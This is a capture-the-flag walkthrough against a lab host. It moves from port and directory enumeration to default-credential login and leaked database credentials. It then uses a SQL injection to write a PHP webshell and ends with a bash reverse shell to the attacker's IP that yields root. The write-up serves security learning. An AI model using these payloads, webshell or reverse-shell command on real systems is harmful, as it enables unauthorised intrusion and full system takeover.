# CTF Writeup: Hawat

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.153.147
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 02:57 EST
Nmap scan report for 192.168.153.147
Host is up (0.034s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open   http         Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Issue Tracker
30455/tcp open   http         nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), Linux 3.10 - 4.11 (91%), OpenWrt 22.03 (Linux 5.10) (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   36.73 ms 192.168.45.1
2   36.71 ms 192.168.45.254
3   36.90 ms 192.168.251.1
4   36.97 ms 192.168.153.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds
```

There seems to be 3 http instances running on port 17445,30455 & 50080.

Let's start with enumerating 17445.

It reveals that it's hosting tomcat, but when observing the page, we can see an login & register functionality and 3 messages with id's.

Enumerating hidden endpoints on the website also doesn't reveal more information.

```
dirsearch -u http://192.168.153.147:17445
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.153.147_17445/_25-12-24_03-03-05.txt

Target: http://192.168.153.147:17445/

[03:03:05] Starting: 
[03:03:05] 404 -  104B  - /js                                               
[03:03:09] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[03:03:10] 400 -  435B  - /a%5c.aspx                                        
[03:03:19] 404 -  105B  - /css                                              
[03:03:24] 404 -  107B  - /index                                            
[03:03:25] 404 -  114B  - /js/prepod.js                                     
[03:03:25] 404 -  117B  - /js/envConfig.js                                  
[03:03:25] 404 -  114B  - /js/config.js
[03:03:25] 404 -  112B  - /js/prod.js
[03:03:25] 404 -  112B  - /js/routing
[03:03:25] 404 -  128B  - /js/swfupload/swfupload.swf
[03:03:25] 404 -  110B  - /js/qa.js                                         
[03:03:25] 404 -  105B  - /js/
[03:03:25] 404 -  131B  - /js/swfupload/swfupload_f9.swf
[03:03:25] 404 -  114B  - /js/FCKeditor
[03:03:25] 404 -  113B  - /js/tiny_mce
[03:03:25] 404 -  114B  - /js/tiny_mce/
[03:03:25] 404 -  126B  - /js/elfinder/elfinder.php
[03:03:25] 404 -  113B  - /js/tinymce/
[03:03:25] 404 -  112B  - /js/tinymce
[03:03:25] 404 -  137B  - /js/yui/uploader/assets/uploader.swf
[03:03:25] 404 -  122B  - /js/ZeroClipboard.swf                             
[03:03:25] 404 -  124B  - /js/ZeroClipboard10.swf                           
[03:03:26] 200 -    1KB - /login                                            
[03:03:26] 302 -    0B  - /logout  ->  http://192.168.153.147:17445/index   
[03:03:33] 200 -    2KB - /register
```

Let's move on onto the nginx service.

The second webpage seems to be just a website with some sales. Without any backend functionalities.

Enumerating endpoints revealed an exposed /phpinfo.php file in which we were able to enumerate JESSIONID Token & also the webroot which is /srv/http.

```
dirsearch -u http://192.168.153.147:30455
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.153.147_30455/_25-12-24_03-06-26.txt

Target: http://192.168.153.147:30455/

[03:06:26] Starting:                                                                                                                          
[03:06:30] 301 -  169B  - /4  ->  http://192.168.153.147:30455/4/           
[03:07:02] 200 -   68KB - /phpinfo.php
```
```
JSESSIONID=657D43ADF11451AAB73E77FF19CF98DC
```

The 3. endpoint seems to be also an webpage without any backend functionality.

Enumerating hidden endpoints, we discovered an /cloud endpoint which is running an "Nextcloud" Application with an login interface.

```
dirsearch -u http://192.168.153.147:50080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.153.147_50080/_25-12-24_03-34-21.txt

Target: http://192.168.153.147:50080/

[03:34:21] Starting:                                                                                                                          
[03:34:23] 403 -  980B  - /.ht_wsr.txt                                      
[03:34:23] 403 -  980B  - /.htaccess.bak1                                   
[03:34:23] 403 -  980B  - /.htaccess.orig                                   
[03:34:23] 403 -  980B  - /.htaccess.save                                   
[03:34:23] 403 -  980B  - /.htaccess.sample
[03:34:23] 403 -  980B  - /.htaccess_extra                                  
[03:34:23] 403 -  980B  - /.htaccess_sc                                     
[03:34:23] 403 -  980B  - /.htaccessBAK
[03:34:23] 403 -  980B  - /.htaccess_orig
[03:34:23] 403 -  980B  - /.htaccessOLD
[03:34:23] 403 -  980B  - /.htaccessOLD2
[03:34:24] 403 -  980B  - /.htm                                             
[03:34:24] 403 -  980B  - /.html                                            
[03:34:24] 403 -  980B  - /.htpasswds                                       
[03:34:24] 403 -  980B  - /.htpasswd_test
[03:34:24] 403 -  980B  - /.httr-oauth
[03:34:26] 301 -  239B  - /4  ->  http://192.168.153.147:50080/4/           
[03:34:34] 403 -  980B  - /cgi-bin/imagemap.exe?2,2                         
[03:34:34] 403 -  980B  - /cgi-bin/htmlscript
[03:34:34] 403 -  980B  - /cgi-bin/login.cgi
[03:34:34] 403 -  980B  - /cgi-bin/mt/mt-xmlrpc.cgi
[03:34:34] 403 -  980B  - /cgi-bin/login                                    
[03:34:34] 403 -  980B  - /cgi-bin/a1stats/a1disp.cgi                       
[03:34:34] 403 -  980B  - /cgi-bin/mt-xmlrpc.cgi
[03:34:34] 403 -  980B  - /cgi-bin/login.php
[03:34:34] 403 -  980B  - /cgi-bin/index.html
[03:34:34] 403 -  994B  - /cgi-bin/awstats/
[03:34:34] 403 -  980B  - /cgi-bin/mt.cgi
[03:34:34] 403 -  994B  - /cgi-bin/
[03:34:34] 403 -  980B  - /cgi-bin/awstats.pl
[03:34:34] 403 -  980B  - /cgi-bin/mt/mt.cgi
[03:34:34] 403 -  980B  - /cgi-bin/htimage.exe?2,2                          
[03:34:34] 403 -  980B  - /cgi-bin/mt7/mt-xmlrpc.cgi
[03:34:34] 403 -  980B  - /cgi-bin/mt7/mt.cgi
[03:34:34] 403 -  980B  - /cgi-bin/php.ini
[03:34:34] 403 -  980B  - /cgi-bin/printenv.pl
[03:34:34] 403 -  980B  - /cgi-bin/printenv
[03:34:34] 403 -  980B  - /cgi-bin/test.cgi
[03:34:34] 403 -  980B  - /cgi-bin/ViewLog.asp
[03:34:34] 403 -  980B  - /cgi-bin/test-cgi                                 
[03:34:34] 301 -  243B  - /cloud  ->  http://192.168.153.147:50080/cloud/   
[03:34:35] 302 -    0B  - /cloud/  ->  http://192.168.153.147:50080/cloud/index.php/login
[03:34:37] 403 -  994B  - /error/                                           
[03:34:40] 301 -  244B  - /images  ->  http://192.168.153.147:50080/images/ 
[03:34:41] 200 -    1KB - /images/
[03:35:08] 403 -  980B  - /~bin                                             
[03:35:08] 403 -  980B  - /~daemon                                          
[03:35:09] 403 -  980B  - /~ftp                                             
[03:35:09] 403 -  980B  - /~http                                            
[03:35:09] 403 -  980B  - /~mail                                            
[03:35:09] 403 -  980B  - /~nobody                                          
[03:35:09] 403 -  980B  - /~root
```

We successfuly logged in by guessing the login credentials

```
admin:admin
```

## Vulnerability Assessment

The .zip file within the resources looks promising. Let's download it to our local machine and check what's inside!

After unzipping the file we get an source code of an application. 

Enumerating the file further, we can identify that there is an interesting file in /issuetracker/src/main/java/com/issue/tracker/issues called "IssueController.java".

It provides us with credentials.

```
connectionProps.put("user", "issue_user");
connectionProps.put("password", "ManagementInsideOld797");
```

Judging from the source code the application it seems to be vulnerable to SQL Injection, since the query isn't properly sanitized.

```
String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
```

It's also interesting that the function is checking on an directory called /issue/checkByPriority

Moving back to the first service running on port 17445, we can also identify that this seems to be the backend for the "Issue Tracker" Application. Since we know it's vulnerable to SQLi and we know that the endpoint is configured, let's register an acc and login.

Up on logging in we navigate to the following endpoint & got an 404.

```
http://192.168.153.147:17445/issue/checkByPriority
```

Let's intercept the request within burpsuite & play around with it.

By default we get an 405 error and the server response is rather odd, since it told us that POST is allowed.

Swapping the request from GET to POST changed the response of the server to --> 400.

I also utilized the following query in order to get an php webshell.

```
' UNION SELECT '<?php echo system($_GET["cmd"]);' INTO OUTFILE '/srv/http/cmd.php' -- 
```

Utilized www.urlencoder.org to url-encode the query. Utilized the vulnerable variable and put it with an question mark behind the endpoint. The following request, provided us with an 200 server response, which meant we should have our webshell on /srv/http/cmd.php now active. 

```
POST /issue/checkByPriority?priority=High%27+union+select+%27%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29%3B%27+into+outfile+%27%2Fsrv%2Fhttp%2Fcmd.php%27+--+ HTTP/1.1
Host: 192.168.153.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=7EB8C720705B135730C5333136465FB4
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Note that it's important that on the query you have an space at the end, otherwise it won't work!

Accessing our webshell on port :30455 in which we also retrieved the webroot /srv/http we successfully get command injection.

```
http://192.168.153.147:30455/cmd.php?cmd=whoami
```

Let's prepare our listener for RCE on port 50080, we will utilize this port since an service is running on it & it shouldn't be blocked by firewall.

```
nc -lvnp 50080
```

I utilized the following bash rev shell command in order to get RCE, it's important to url encode it with https://www.url-encode-decode.com/.

```
http://192.168.153.147:30455/cmd.php?cmd=%2Fbin%2Fbash+-c+%27bash+%3E%26+%2Fdev%2Ftcp%2F192.168.45.202%2F50080+0%3E%261%27
```

Gained RCE as user "root".

```
nc -lvnp 50080
listening on [any] 50080 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.153.147] 43510
whoami
root
```

Retrieved proof.txt in /root directory.

```
074aed2fb6b5004db35711547917d279
```
